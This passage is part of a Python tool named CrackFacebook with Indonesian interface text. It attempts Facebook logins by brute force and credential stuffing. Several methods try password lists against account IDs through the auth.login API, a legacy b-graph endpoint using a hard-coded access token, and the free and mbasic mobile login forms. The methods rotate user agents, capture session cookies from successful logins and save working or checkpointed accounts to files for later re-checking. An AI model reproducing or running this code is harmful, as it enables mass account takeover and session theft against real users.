                    sorted_data = sorted(data.items(), key=lambda x: x[0])
                    sig_string = "".join([f"{k}={v}" for k, v in sorted_data]) + secret
                    data["sig"] = hashlib.md5(sig_string.encode('utf-8')).hexdigest()
                    header = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip, deflate'}
                    response = self.ses.post('https://api.facebook.com/method/auth.login', data=data, headers=header, timeout=8).json()
                    if "session_key" in response:
                        cookies = ";".join([f"{c['name']}={c['value']}" for c in response['session_cookies']])
                        self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file, cookies); break
                    elif response.get('error_code') == 405 or "checkpoint" in response.get("error_msg", "").lower():
                        self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file); break
                    break
                except requests.ConnectionError:
                    self.status_message = f"[bold {ERROR_COLOR}]Koneksi error, mencoba lagi...[/]"; update_ui(); time.sleep(5); self.status_message = ""; retries += 1; continue
                except Exception: break
        self.loop += 1
        progress.update(task_id, advance=1)
        update_ui()

    def _method_api_legacy(self, identifier, pwx, task_id, progress, update_ui, ok_file, cp_file):
        # [DIKEMBALIKAN] Metode API legacy menggunakan access token statis
        self.recent_targets.appendleft(identifier)
        for password in pwx:
            if identifier in [u.split('|')[0] for u in hasil_ok] or identifier in [u.split('|')[0] for u in hasil_cp]: break
            retries = 0
            while retries < 3:
                try:
                    ua = self.generate_modern_ua()
                    data = {"adid": uuid.uuid4(),"format": "json","device_id": uuid.uuid4(),"email": identifier,"password": password,"generate_analytics_claim": "1","credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate","api_key": "882a8490361da98702bf97a021ddc14d","access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"}
                    header = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'b-graph.facebook.com','X-FB-Connection-Type': 'WIFI','Accept-Encoding': 'gzip, deflate','X-FB-HTTP-Engine': 'Liger'}
                    response = self.ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=header, timeout=8).json()
                    if "session_key" in response:
                        cookies = ";".join([f"{c['name']}={c['value']}" for c in response['session_cookies']])
                        self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file, cookies); break
                    elif "www.facebook.com" in response.get('error', {}).get('message', ''):
                        self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file); break
                    break
                except requests.ConnectionError:
                    self.status_message = f"[bold {ERROR_COLOR}]Koneksi error, mencoba lagi...[/]"; update_ui(); time.sleep(5); self.status_message = ""; retries += 1; continue
                except Exception: break
        self.loop += 1
        progress.update(task_id, advance=1)
        update_ui()

    def _method_mobile(self, identifier, pwx, task_id, progress, update_ui, ok_file, cp_file):
        self.recent_targets.appendleft(identifier)
        for password in pwx:
            if identifier in [u.split('|')[0] for u in hasil_ok] or identifier in [u.split('|')[0] for u in hasil_cp]: break
            retries = 0
            while retries < 3:
                try:
                    with requests.Session() as session:
                        ua = random.choice(user_agents)
                        url = "https://free.facebook.com"
                        resp = session.get(f"{url}/login/device-based/password/?uid={identifier}&flow=login_no_pin", headers={'User-Agent': ua}, timeout=8)
                        data = {"lsd": re.search('name="lsd" value="(.*?)"', resp.text).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', resp.text).group(1),"uid": identifier,"pass": password,"flow": "login_no_pin", "email": identifier}
                        headers = {'Host': url.replace('https://',''),'origin': url,'referer': resp.url,'User-Agent': ua}
                        post_resp = session.post(f'{url}/login/device-based/validate-password/?shbl=0', data=data, headers=headers, timeout=8, allow_redirects=False)
                        if "c_user" in session.cookies.get_dict():
                            cookies = ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                            self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file, cookies); break
                        elif "checkpoint" in session.cookies.get_dict():
                            self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file); break
                        break
                except requests.ConnectionError:
                    self.status_message = f"[bold {ERROR_COLOR}]Koneksi error, mencoba lagi...[/]"; update_ui(); time.sleep(5); self.status_message = ""; retries += 1; continue
                except Exception: break
        self.loop += 1
        progress.update(task_id, advance=1)
        update_ui()

    def _method_mbasic(self, identifier, pwx, task_id, progress, update_ui, ok_file, cp_file):
        self.recent_targets.appendleft(identifier)
        for password in pwx:
            if identifier in [u.split('|')[0] for u in hasil_ok] or identifier in [u.split('|')[0] for u in hasil_cp]: break
            retries = 0
            while retries < 3:
                try:
                    with requests.Session() as session:
                        ua = random.choice(user_agents)
                        url = "https://mbasic.facebook.com"
                        resp = session.get(f"{url}/login", headers={'User-Agent': ua}, timeout=8)
                        form = BeautifulSoup(resp.text, 'html.parser').find('form', method='post')
                        if not form: continue
                        data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
                        data.update({'email': identifier, 'pass': password})
                        headers = {'Host': url.replace('https://',''),'origin': url,'referer': resp.url,'User-Agent': ua}
                        post_resp = session.post(url + form.get('action'), data=data, headers=headers, timeout=8, allow_redirects=False)
                        if "c_user" in session.cookies.get_dict():
                            cookies = ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                            self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file, cookies); break
                        elif "checkpoint" in session.cookies.get_dict():
                            self._submit_result(identifier, password, task_id, progress, update_ui, ok_file, cp_file); break
                        break
                except requests.ConnectionError:
                    self.status_message = f"[bold {ERROR_COLOR}]Koneksi error, mencoba lagi...[/]"; update_ui(); time.sleep(5); self.status_message = ""; retries += 1; continue
                except Exception: break
        self.loop += 1
        progress.update(task_id, advance=1)
        update_ui()

    def cek_hasil_cp(self):
        self.clear_screen(); self.banner()
        cp_files = sorted([f for f in os.listdir() if f.startswith('CP-') and f.endswith('.txt')])
        if not cp_files: console.print(f"[{ERROR_COLOR}]Tidak ada file hasil CP ditemukan.[/]"); time.sleep(3); self.menu_utama(); return
        for i, file_name in enumerate(cp_files): console.print(f"  [{INFO_COLOR}]{i+1}[/]. {escape(file_name)}")
        try:
            pilihan = int(console.input(f"  [{INFO_COLOR}]›[/] Pilih nomor file: "))
            file_to_check = cp_files[pilihan - 1]
        except (ValueError, IndexError): console.print(f"[{ERROR_COLOR}]Pilihan tidak valid.[/]"); time.sleep(2); self.cek_hasil_cp(); return
        with open(file_to_check, 'r') as f: accounts = f.read().splitlines()
        console.print(f"[{INFO_COLOR}]Memeriksa [bold]{len(accounts)}[/] akun...[/]")
        table = Table(title=f"Hasil Pengecekan - {escape(file_to_check)}", border_style=BORDER_COLOR, box=box.ROUNDED)
        table.add_column("No.", style="cyan"); table.add_column("Akun", style=TEXT_COLOR); table.add_column("Status", style="bold")
        for i, account in enumerate(accounts):
            if '|' not in account: continue
            uid, password, *_ = (account.split('|') + [None, None])
            status, color = self._login_checker(uid, password)
            table.add_row(str(i+1), f"{escape(uid)}|{escape(password)}", f"[{color}]{status}[/]")
            time.sleep(1)
        console.print(table); console.input("\n  [Tekan Enter untuk kembali]"); self.menu_utama()

    def _login_checker(self, identifier, password):
        try:
            with requests.Session() as session:
                ua = random.choice(user_agents)
                url = "https://mbasic.facebook.com"
                resp = session.get(f"{url}/login", headers={'User-Agent': ua})
                form = BeautifulSoup(resp.text, 'html.parser').find('form', method='post')
                if not form: return "ERROR (Form Not Found)", ERROR_COLOR
                data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
                data['email'] = identifier; data['pass'] = password
                post_resp = session.post(url + form.get('action'), data=data, headers={'User-agent': ua}, allow_redirects=False)
                if "c_user" in session.cookies.get_dict(): return "OK", OK_COLOR
                elif "checkpoint" in session.cookies.get_dict(): return "CP", CP_COLOR
                else: return "GAGAL", TEXT_COLOR
        except requests.exceptions.RequestException: return "ERROR (Connection Failed)", ERROR_COLOR
        except Exception: return "ERROR (Parsing Failed)", ERROR_COLOR

if __name__ == "__main__":
    try:
        CrackFacebook().menu_utama()
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]Proses dihentikan pengguna.[/]")
    except Exception as e:
        console.print(f"\n[{ERROR_COLOR}]Terjadi kesalahan tak terduga:[/]")
        console.print(e)